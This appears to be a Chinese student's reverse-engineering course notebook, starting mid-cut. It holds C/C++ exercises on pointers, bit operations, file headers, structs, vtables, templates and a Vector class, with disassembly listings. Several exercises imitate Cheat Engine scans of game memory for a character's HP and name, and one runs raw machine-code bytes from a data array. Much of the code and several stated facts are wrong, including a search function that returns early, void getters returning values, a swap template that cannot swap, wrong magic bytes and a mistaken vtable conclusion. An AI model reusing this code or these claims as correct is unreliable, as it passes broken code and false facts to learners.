\u0026p3;\tp5 = \u0026p4;\tp6 = \u0026p5;\tp7 = \u0026p6;\t16: p1 = \u0026p; 0040102F lea eax,[ebp-4] 00401032 mov dword ptr [ebp-20h],eax 17: p2 = \u0026p1; 00401035 lea ecx,[ebp-20h] 00401038 mov dword ptr [ebp-1Ch],ecx 18: p3 = \u0026p2; 0040103B lea edx,[ebp-1Ch] 0040103E mov dword ptr [ebp-18h],edx 19: p4 = \u0026p3; 00401041 lea eax,[ebp-18h] 00401044 mov dword ptr [ebp-14h],eax 20: p5 = \u0026p4; 00401047 lea ecx,[ebp-14h] 0040104A mov dword ptr [ebp-10h],ecx 21: p6 = \u0026p5; 0040104D lea edx,[ebp-10h] 00401050 mov dword ptr [ebp-0Ch],edx 22: p7 = \u0026p6; 00401053 lea eax,[ebp-0Ch] 00401056 mov dword ptr [ebp-8],eax 完成代码，实现数组值的互换\nvoid Function()\t{\tint arr[5] = {1,2,3,4,5};\t//..此处添加代码，使用指针，将数组的值倒置\t//打印数组值的代码已经写完，不需要修改\tfor(int k=0;k\u003c5;k++)\t{\tprintf(\"%d\\n\",*(p+k));\t}\t}\tvoid Function()\t{\tint arr[5] = {1,2,3,4,5};\tint *p = arr; int k=0; int i = 0; int t; for (i = 0; i \u003c 5 / 2; i++) { t = *(p + i); *(p + i) = *(p + 4 - i); *(p + 4 - i) = t; } for(;k\u003c5;k++)\t{\tprintf(\"%d\\n\",*(p+k));\t}\t}\t模拟实现CE的数据搜索功能：\n这一堆数据中存储了角色的血值信息，假设血值的类型为int类型，值为100（10进制），请列出所有可能的值以及该值对应的地址\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\tchar arr[100] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t}; void findaddr(int num) { char* start = arr; int i = 0; int* pt = (int*)start; while(i\u003c100) { if(*pt==num) { printf(\"[%x]=%d\\n\", start, *pt); } i++; start++; pt = (int*)start; } } void main() { findaddr(0x64); } 模拟实现CE的数据搜索功能：\n这一堆数据中存储了角色的名字信息（WOW），请列出角色名的内存地址\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t#include \u003cstdio.h\u003e char arr[100] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 }; void Findasc() { char* p=arr; char * z=\"WOW\"; int* x; int* y; int i=0; for(; i\u003c98; i++) { x=(int*)(p+i); y=(int*)z; if (*(p + i) == z[0] \u0026\u0026 *(p + i + 1) == z[1] \u0026\u0026 *(p + i + 2) == z[2]) printf(\"%x == %s\",x,y); } } void main() { Findasc(); } 编写函数，返回角色名字信息的地址，如果没有返回0\nchar* FindRoleNameAddr(char* pData,char* pRoleName) { size_t nameLength = strlen(pRoleName); for (char* ptr = pData; *ptr != '\\0'; ptr++) { if (strncmp(ptr, pRoleName, nameLength) == 0) { return ptr; }else return 0; } } 编写函数，遍历上面数据中所有角色名字\n#include \u003cstdio.h\u003e char arr[100] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 }; void FindAllRoleNames(char* pData) { char* start = pData; char name[50]; int i = 0; while (i \u003c 100) { if (*(start + i) != 0) { int j = 0; while (i \u003c 100 \u0026\u0026 *(start + i) != 0) { name[j++] = *(start + i); i++; } name[j] = '\\0'; printf(\"name: %s\\n\", name); } i++; } } int main() { FindAllRoleNames(arr); return 0; } 创建一个int* arr[5]数组，并为数组赋值（使用\u0026）\nint a1 = 1;\tint a2 = 2;\tint a3 = 3;\tint a4 = 4;\tint a5 = 5;\tint* p1 = \u0026a1;\tint* p2 = \u0026a2;\tint* p3 = \u0026a3;\tint* p4 = \u0026a4;\tint* p5 = \u0026a5;\tint* arr[5] = {p1,p2,p3,p4,p5}; for (int i = 0; i \u003c 5; i++) { printf(\"arr[%d] = %d\\n\", i, *arr[i]); } 创建一个字符指针数组，存储所有的C的关键词（查资料找），并全部打印出来\n#include \u003cstdio.h\u003e int main() { char* a1 = \"auto\"; char* a2 = \"break\"; char* a3 = \"case\"; char* a4 = \"char\"; char* a5 = \"const\"; char* a6 = \"continue\"; char* a7 = \"default\"; char* a8 = \"do\"; char* a9 = \"double\"; char* a10 = \"else\"; char* a11 = \"enum\"; char* a12 = \"extern\"; char* a13 = \"float\"; char* a14 = \"for\"; char* a15 = \"goto\"; char* a16 = \"if\"; char* a17 = \"int\"; char* a18 = \"long\"; char* a19 = \"register\"; char* a20 = \"restrict\"; char* a21 = \"return\"; char* a22 = \"short\"; char* a23 = \"signed\"; char* a24 = \"sizeof\"; char* a25 = \"static\"; char* a26 = \"struct\"; char* a27 = \"switch\"; char* a28 = \"typedef\"; char* a29 = \"union\"; char* a30 = \"unsigned\"; char* a31 = \"void\"; char* a32 = \"volatile\"; char* a33 = \"while\"; char* a34 = \"_Alignas\"; char* a35 = \"_Alignof\"; char* a36 = \"_Atomic\"; char* a37 = \"_Bool\"; char* a38 = \"_Complex\"; char* a39 = \"_Generic\"; char* a40 = \"_Imaginary\"; char* a41 = \"_Noreturn\"; char* a42 = \"_Static_assert\"; char* a43 = \"_Thread_local\"; char* sym[] = { a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32, a33, a34, a35, a36, a37, a38, a39, a40, a41, a42, a43 }; int num_keywords = sizeof(sym) / sizeof(sym[0]); for (int i = 0; i \u003c num_keywords; i++) { printf(\"%s\\n\", sym[i]); } return 0; } 查找这些数据中，有几个id=1 level=8的结构体信息。\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t结构体定义如下：\ttypedef struct TagPlayer\t{\tint id;\tint level;\t}Player;\tchar arr[] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t}; typedef struct TagPlayer\t{\tint id;\tint level;\t}Player; void Fun() { Player* p; p = (Player*)arr; char* q = (char*)p; for(int i=0;i\u003c92;i++) { if(p-\u003eid == 0x1 \u0026\u0026 p-\u003elevel == 0x8) {\tprintf(\"%x\\n\",p); }\tq++; p = (Player*)q; } } int main(int argc, char* argv[]) { Fun(); return 0; } *(p+1)[2]是否一定等于p[1][2]呢？ 通过反汇编进行论证。\n#include \u003cstdio.h\u003e int main() { {% raw %} int arr[3][3] = {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}}; {% endraw %} int (*p)[3] = arr; printf(\"*(p+1)[2]: %d\\n\", *(p+1)[2]); printf(\"p[1][2]: %d\\n\", p[1][2]); return 0; } 差别： .text:0000000000001188 ; 15: printf(\"*(p+1)[2]: %d\\n\", (unsigned int)v4[9]); .text:0000000000001188 mov rax, [rbp+var_8] .text:000000000000118C add rax, 24h ; '$' .text:0000000000001190 mov eax, [rax] .text:0000000000001192 mov esi, eax .text:00000000000011A8 ; 16: printf(\"p[1][2]: %d\\n\", (unsigned int)v5[5]); .text:00000000000011A8 mov rax, [rbp+var_8] .text:00000000000011AC add rax, 0Ch .text:00000000000011B0 mov eax, [rax+8] .text:00000000000011B3 mov esi, eax 使用数组指针遍历一个一维数组\n#include \u003cstdio.h\u003e int main() { int arr[] = {1, 2, 3, 4, 5}; int *ptr = arr; for (int i = 0; i \u003c 5; i++) { printf(\"Element %d: %d\\n\", i, *(ptr + i)); } return 0; } 将一个函数存储到数据区，通过指针进行访问\n#include \u003cstdio.h\u003e unsigned char arr[] = { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x40, 0x53, 0x56, 0x57, 0x8D, 0x7D, 0xC0, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x8B, 0x45, 0x08, 0x2B, 0x45, 0x0C, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3 }; int main() { typedef int (*pFun)(int,int); pFun p = (int (*)(int ,int ))\u0026arr; int x = 0; x = p(9,5); printf(\"%d\",x); return 0; } char数组内容如下：\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t不运行说出下面的结果：\t指针定义如下：\t*(*(px+0)+0) =\u003e 03020100\tint (*px)[2]; *(*(px+1)+0)\tint (*py)[2][3]; *(*(px+2)+3)\tchar (*pz)[2];\t*(*(*(py+1)+2)+3)\tchar (*pk)[2][3];\t*(*(pz+2)+3)\t*(*(*(pk+2)+3)+4)\t位运算 定义一个unsiged char类型，通过程序为第3、5、7位赋值，赋值时不能影响到其它位原来的值（使用位操作指令、比如：\u0026 | ! ^ \u003c\u003c \u003e\u003e等）\n#include \u003cstdio.h\u003e int main() { unsiged char x = 9; x = x | (1 \u003c\u003c 2); x = x | (1 \u003c\u003c 4); x = x | (1 \u003c\u003c 6); return 0; } 判断某个位的值是否为1（使用位操作指令、比如：\u0026 | ! ^ \u003c\u003c \u003e\u003e等）\nint main() { unsigned char x = 85; int bit = 3; unsigned char mask = 1 \u003c\u003c bit; if (x \u0026 mask) { printf(\"1\"); } else { printf(\"0\"); } return 0; } 读取第7、6、5位的值，以十进制显示（unsigned）\nint main() { unsigned char x = 85; unsigned char ge = 0; unsigned char shi = 0; unsigned char bai = 0; unsigned char mask = 111 \u003c\u003c 4; x = x ^ mask; ge = x \u0026 1; shi = x \u0026 (1\u003c\u003c1) \u003e\u003e 1; bai = x \u0026 (1\u003c\u003c2) \u003e\u003e 2; printf(\"%d\",ge+shi*2+bai*4); return 0; } 用十六进制文本编辑器分别打开一个.exe .dll .sys .txt .doc .jpg .pdf等将前四个字节写在下面\n.exe =\u003e 4D 5A .dll =\u003e 4D 5A .sys =\u003e 4D 5A .txt =\u003e 00 00 .doc =\u003e 50 4B .jpg =\u003e FF D8 .pdf =\u003e 25 50 将一个在十六进制编辑器中打开的.exe文件，拖拽到最后，观察文件中的大小和硬盘上的大小\n相同 C++ this指针 设计一个结构体，有两个int类型的成员X，Y在结构体内部定义4个函数分别实现对XY的加法、减法、乘法与除法的功能\nstruct start { int X; int Y; int add() { return this-\u003eX + this-\u003eY; } int sub() { return this-\u003eX - this-\u003eY; } int mul() { return this-\u003eX * this-\u003eY; } int div() { return this-\u003eX / this-\u003eY; } }; 观察这些函数调用的时候，与其他的函数调用有哪些不同？从参数传递、压栈顺序、堆栈平衡来总结\n其他的函数调用是通过寄存器或栈传递参数的，而这些则是通过[rbp-8]来传递第一个参数\nstart::add(): push rbp mov rbp, rsp mov QWORD PTR [rbp-8], rdi ;栈中存储指针，后续解引用操作内存数据 mov rax, QWORD PTR [rbp-8] mov edx, DWORD PTR [rax] mov rax, QWORD PTR [rbp-8] mov eax, DWORD PTR [rax+4] add eax, edx pop rbp ret add(int, int): push rbp mov rbp, rsp mov DWORD PTR [rbp-4], edi ;栈中直接存储整数，直接加载至寄存器进行算术运算 mov DWORD PTR [rbp-8], esi mov edx, DWORD PTR [rbp-4] mov eax, DWORD PTR [rbp-8] add eax, edx pop rbp ret 结构体的大小是多少？为什么？\n8 下面代码能否执行？（√）\nstruct Person { void Fn_1() { printf(\"Person:Fn_1()\\n\"); } void Fn_2() { printf(\"Person:Fn_2()%x\\n\"); } }; int main(int argc, char* argv[]) { Person* p = NULL; p-\u003eFn_1(); p-\u003eFn_2(); return 0; } 下面代码能否执行？（×）\nstruct Person { int x ; void Fn_1() { printf(\"Person:Fn_1()\\n\"); } void Fn_2() { x = 10; printf(\"Person:Fn_2()%x\\n\"); } }; int main(int argc, char* argv[]) { Person* p = NULL; p-\u003eFn_1(); p-\u003eFn_2(); return 0; } 构造-析构函数 设计一个结构DateInfo，要求其满足下述要求。\n有三个成员： int year; int month; int day; 要求有个带参数的构造函数，其参数分别为对应年、月、日。 有一个无参数的构造函数，其初始的年、月、日分别为：2015、4、2。 要求有一个成员函数实现日期的设置：SetDay(int day) 要求有一个成员函数实现日期的获取：GetDay() 要求有一个成员函数实现年份的设置：SetYear(int year) 要求有一个成员函数实现年份的获取：GetYear() 要求有一个成员函数实现月份的设置：SetMonth(int month) 要求有一个成员函数实现月份的获取：GetMonth() struct DateInfo { int year; int month; int day; DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) { this -\u003e day = day; } int GetDay() { return this -\u003e day; } void SetYear(int year) { this -\u003e year = year; } int GetYear() { return this -\u003e year; } void SetMonth(int month) { this -\u003e month = month; } int GetMonth() { return this -\u003e month; } } 设计一个结构TimeInfo，要求其满足下述要求。\n该结构中包含表示时间的时、分、秒。 设置该结构中时、分、秒的函数。 获取该结构中时、分、秒的三个函数：GetHour()，GetMinute()和GetSecond()。 struct TimeInfo { int hour; int minute; int second; TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() { return this -\u003e hour; } void GetMinute() { return this -\u003e minute; } void GetSecond() { return this -\u003e second; } } 让TimeInfo继承DateInfo分别使用DataInfo和TimeInfo的指针访问TimeInfo\nstruct DateInfo { int year; int month; int day; DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) { this -\u003e day = day; } int GetDay() { return this -\u003e day; } void SetYear(int year) { this -\u003e year = year; } int GetYear() { return this -\u003e year; } void SetMonth(int month) { this -\u003e month = month; } int GetMonth() { return this -\u003e month; } } struct TimeInfo:DateInfo { int hour; int minute; int second; TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() { return this -\u003e hour; } void GetMinute() { return this -\u003e minute; } void GetSecond() { return this -\u003e second; } } 设计一个结构叫做MyString，要求该结构能够完成以下功能：\n构造函数能够根据实际传入的参数分配实际存储空间； 提供一个无参的构造函数，默认分配大小为1024个字节； 析构函数释放该空间； 编写成员函数SetString，可以将一个字符串赋值给该结构（申请的空间）； 编写成员函数PrintString，可以将该结构的内容打印到屏幕上； 编写成员函数AppendString，用于向已有的数据后面添加数据； 编写成员函数Size，用于得到当前数据的真实长度。 编写测试程序，测试这个结构。\nstruct MyString { char* addr; MyString(int size) { addr = (char*)malloc(size); } MyString() { addr = (char*)malloc(1024); } ~MyString() { free(addr); addr = NULL; } void SetString(char* addr) { strcpy(this -\u003e addr,addr); } void PrintString() { print(\"%s\",addr); } void AppendString(char* addr) { strcat(this -\u003e addr,addr); } void Size() { return strlen(this -\u003e addr); } } 权限控制 将上一节课的所有练习改为class实现\n添加private/public进行权限控制 将类的定义与实现分开来写：定义写到xxx.h中，函数实现写在xxx.cpp中 //xxx.h struct DateInfo { private: int year; int month; int day; public: DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) int GetDay() void SetYear(int year) int GetYear() void SetMonth(int month) int GetMonth() } struct TimeInfo:public DateInfo { private: int hour; int minute; int second; public: TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() void GetMinute() void GetSecond() } //xxx.cpp void DataInfo::SetDay(int day) { this -\u003e day = day; } int DataInfo::GetDay() { return this -\u003e day; } void DataInfo::SetYear(int year) { this -\u003e year = year; } int DataInfo::GetYear() { return this -\u003e year; } void DataInfo::SetMonth(int month) { this -\u003e month = month; } int DataInfo::GetMonth() { return this -\u003e month; } void TimeInfo::GetHour() { return this -\u003e hour; } void TimeInfo::GetMinute() { return this -\u003e minute; } void TimeInfo::GetSecond() { return this -\u003e second; } 虚函数 int main() { Sub sub; void** vtable = *(void***)\u0026sub; printf(\"base :%p\\n\",vtable); for(int i = 0; i \u003c 9; i++) { printf(\"[%d]: %p\\n\", i, vtable[i]); } return 0; } 单继承无函数覆盖（打印Sub对象的虚函数表）\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_4() { printf(\"Sub:Function_4...\\n\"); } virtual void Function_5() { printf(\"Sub:Function_5...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; base :00007ff77ca73c80 [0]: 00007ff77ca71a90 [1]: 00007ff77ca71ab0 [2]: 00007ff77ca71ad0 [3]: 00007ff77ca71a30 [4]: 00007ff77ca71a50 [5]: 00007ff77ca71a70 [6]: 0000000000000000 [7]: 00007ff77ca73b60 [8]: 00007ff77ca719e0 单继承有函数覆盖（打印Sub对象的虚函数表）\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_1() { printf(\"Sub:Function_1...\\n\"); } virtual void Function_2() { printf(\"Sub:Function_2...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; base :00007ff78c643c60 [0]: 00007ff78c641a30 [1]: 00007ff78c641a50 [2]: 00007ff78c641a90 [3]: 00007ff78c641a70 [4]: 0000000000000000 [5]: 00007ff78c643b40 [6]: 00007ff78c6419e0 [7]: 00007ff78c6419b0 [8]: 00007ff78c641e50 似乎继承了重写的虚函数不会出现在虚表中？\n动态绑定 写一个例子程序，能体现多态的作用\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e class Animal { public: virtual void makeSound() { printf(\"mo ren\\n\"); } }; class Dog : public Animal { public: void makeSound() override { printf(\"wang wang\\n\"); } }; class Cat : public Animal { public: void makeSound() override { printf(\"miao miao\\n\"); } }; int main() { Animal* animalPtr; Dog dog; Cat cat; animalPtr = \u0026dog; animalPtr-\u003emakeSound(); // 输出 \"wang wang\" animalPtr = \u0026cat; animalPtr-\u003emakeSound(); // 输出 \"miao miao\" return 0; } 模板 使用模版实现swap(x,y)函数，功能：交换x，y的值\ntemplate\u003cclass I\u003e void swap(I x,I y) { I temp = x; x = y; y = temp; } 冒泡排序：对结构体或者类进行排序，如果不能实现，找出问题所在\n//正常冒泡排序 void Sort(int* arr,int nLength) { int i; int k; for(i=0;i\u003cnLength-1;i++) { for(k=0;k\u003cnLength-1-i;k++) { if(arr[k]\u003earr[k+1]) { int temp = arr[k]; arr[k] = arr[k+1]; arr[k+1] = temp; } } } } 在代码中if(arr[k]\u003earr[k+1])中的\u003e号无法对类或结构体进行比较。\n观察下面两个Sort方法的反汇编代码（看内存地址和内容）：\nint arr[] = {2,6,1,5,4}; char arr1[] = {2,6,1,5,4}; Sort(arr,5); Sort(arr1,5); .text:0000000140001640 mov [rbp+var_20], 2 .text:0000000140001647 mov [rbp+var_1C], 6 .text:000000014000164E mov [rbp+var_18], 1 .text:0000000140001655 mov [rbp+var_14], 5 .text:000000014000165C mov [rbp+var_10], 4 .text:0000000140001663 mov [rbp+var_25], 5010602h ;'\\x05\\x01\\x06\\x02' .text:000000014000166A mov [rbp+var_21], 4 .text:000000014000166E lea rax, [rbp+var_20] .text:0000000140001672 mov edx, 5 .text:0000000140001677 mov rcx, rax .text:000000014000167A call Sort .text:000000014000167F lea rax, [rbp+var_25] .text:0000000140001683 mov edx, 5 .text:0000000140001688 mov rcx, rax .text:000000014000168B call Sort .text:0000000140001690 mov eax, 0 .text:0000000140001695 add rsp, 50h .text:0000000140001699 pop rbp .text:000000014000169A retn 引用-友元-运算符重载 定义一个类，使用友元函数实现：+、-、*、/、\u003e、\u003c、\u003e=、\u003c=等运算符重载（什么情况下，一定要用友元函数?）\nclass Test { private: int x; int y; public: Test(int x,int y); friend Test operator+(const Test\u0026 p1, const Test\u0026 p2); friend Test operator-(const Test\u0026 p1, const Test\u0026 p2); friend Test operator*(const Test\u0026 p1, const Test\u0026 p2); friend Test operator/(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003e(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003c(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003e=(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003c=(const Test\u0026 p1, const Test\u0026 p2); }; Test::Test(int x,int y) { this -\u003e x = x; this -\u003e y = y; } Test operator+(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x + p2.x, p1.y + p2.y); } Test operator-(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x - p2.x, p1.y - p2.y); } Test operator*(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x * p2.x, p1.y * p2.y); } Test operator/(const Test\u0026 p1, const Test\u0026 p2) { if (p2.x == 0 || p2.y == 0) { return Test(0, 0); } return Test(p1.x / p2.x, p1.y / p2.y); } bool operator\u003e(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003e p2.x \u0026\u0026 p1.y \u003e p2.y; } bool operator\u003c(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003c p2.x \u0026\u0026 p1.y \u003c p2.y; } bool operator\u003e=(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003e= p2.x \u0026\u0026 p1.y \u003e= p2.y; } bool operator\u003c=(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003c= p2.x \u0026\u0026 p1.y \u003c= p2.y; } int main() { Test t1; Test t2; int add; add = t1 + t2; return 0; } 从反汇编的角度说说引用与指针的区别\n似乎没有什么区别\n数据结构 Vector 实现一个Vector类\n#define SUCCESS 1 // 成功 #define ERROR -1 // 失败 #define MALLOC_ERROR\t-2 // 申请内存失败 #define INDEX_ERROR\t-3 // 错误的索引号 template \u003cclass T_ELE\u003e class Vector { public: Vector(); Vector(DWORD dwSize); ~Vector(); public: DWORD\tat(DWORD dwIndex,OUT T_ELE* pEle);\t//根据给定的索引得到元素\tDWORD push_back(T_ELE Element);\t//将元素存储到容器最后一个位置 VOID\tpop_back();\t//删除最后一个元素\tDWORD\tinsert(DWORD dwIndex, T_ELE Element);\t//向指定位置新增一个元素\tDWORD\tcapacity();\t//返回在不增容的情况下，还能存储多少元素 VOID\tclear();\t//清空所有元素\tBOOL\tempty();\t//判断Vector是否为空 返回true时为空 VOID\terase(DWORD dwIndex);\t//删除指定元素\tDWORD\tsize();\t//返回Vector元素数量的大小\tprivate: BOOL\texpand();\tprivate: DWORD m_dwIndex;\t//下一个可用索引\tDWORD m_dwIncrement;\t//每次增容的大小\tDWORD m_dwLen;\t//当前容器的长度 DWORD m_dwInitSize;\t//默认初始化大小\tT_ELE *m_pVector;\t//容器指针\t}; template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::Vector():m_dwInitSize(100),m_dwIncrement(5) { //默认初始化大小\t//每次增容的大小 //1.创建长度为m_dwInitSize个T_ELE对象 m_Obj = new T_ELE[m_dwInitSize]; //2.将新创建的空间初始化 memset(m_Obj,0,m_dwInitSize*sizeof(T_ELE)); //3.设置其他值 m_dwIndex = 0; m_dwInitSize = m_dwInitSize; //可能初始化的大小是按照一个成员为单位的，所以就不用乘sizeof(T_ELE)吧 } template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::Vector(DWORD 